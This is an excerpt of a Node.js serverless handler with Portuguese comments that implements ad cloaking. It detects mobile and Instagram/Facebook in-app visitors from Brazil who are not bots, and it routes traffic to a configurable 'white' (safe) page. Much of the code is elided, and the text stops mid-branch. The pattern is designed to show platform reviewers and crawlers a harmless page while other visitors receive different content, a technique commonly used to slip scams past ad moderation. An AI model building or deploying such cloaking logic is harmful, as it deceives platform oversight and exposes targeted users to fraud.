const fetch = require("node-fetch").default; // Adiciona .default para compatibilidade com CommonJS em alguns ambientes
const fs = require("fs");
...
// COLOQUE O LINK DA SUA PÁGINA SEGURA (WHITE) PERSONALIZADA ABAIXO (OPCIONAL):
const URL_PAGINA_WHITE_PERSONALIZADA = ""; // Ex: "https://seusite.com/pagina-segura.html" 
...
function isMobile(userAgent) {
    return /(android|iphone|ipad|ipod|windows phone|iemobile|opera mini|blackberry|webos|mobile|tablet)/i.test(userAgent) || userAgent.includes('Instagram') || userAgent.includes('FBAV') || userAgent.includes('FBAN');
}
...
module.exports = async (req, res) => {
    ...
    if (mobile && country === "BR" && !bot) {
        ...
        // Se houver uma URL de página white personalizada, redireciona para ela
        if (URL_PAGINA_WHITE_PERSONALIZADA) {
            res.writeHead(302, { "Location": URL_PAGINA_WHITE_PERSONALIZADA });
            res.end();
        } else {
            // Caso contrário, serve a Página Segura (White) localmente, mantendo a URL original
